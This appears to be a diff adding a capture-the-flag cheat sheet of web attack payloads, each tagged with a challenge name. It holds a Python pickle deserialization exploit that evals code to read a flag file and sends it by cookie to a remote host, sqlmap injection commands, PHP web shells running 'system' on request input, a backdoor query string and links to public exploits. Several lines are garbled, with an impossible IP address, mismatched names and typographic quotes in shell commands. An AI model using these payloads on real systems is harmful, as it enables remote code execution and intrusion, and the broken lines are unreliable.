@@ -1,0 +1,25 @@
+import pickle
+import base64
+import requests
+
+class Exploit(object):
+        def __reduce__ (self):
+                return eval, ( "open( 'flag' , 'r' ) . read() " , )
+
+def sendPayload(p):
+        print(base64.urlsafe_b64encode(p))
+        headers = {"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
+        t = requests.get("http://34.334.34.334:39434/dashboard",headers=headers)
+        print(t.text)
+
+sendPayload(pickle.dumps(EXPLOIT(), PROTOCOL=2))(sweet and sour)
+
+sqlmap --cookie="asdfghjklasdfghjkl" -u http:34.34.34.34:3434/index.php --forms --columns --random-agent
+<?php echo system($_GET['cmd']);?>(bolt)
+https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py(elastic)
+https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d(libssh)
+<?php system('cat /flag.txt')?>(php unit)
+https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/#mako(shark)
+$ grep –r “shell_exec(“ ;;welldone=knocknock&shazam=ls(non-difbackdoor)
+application/json;;Authorization:  JWT(authorization)
+Sqlmap –cookie==”asdfghjk” -u http://3.3.3.:4545/index.php --forms --columns --random-agent(schematics)
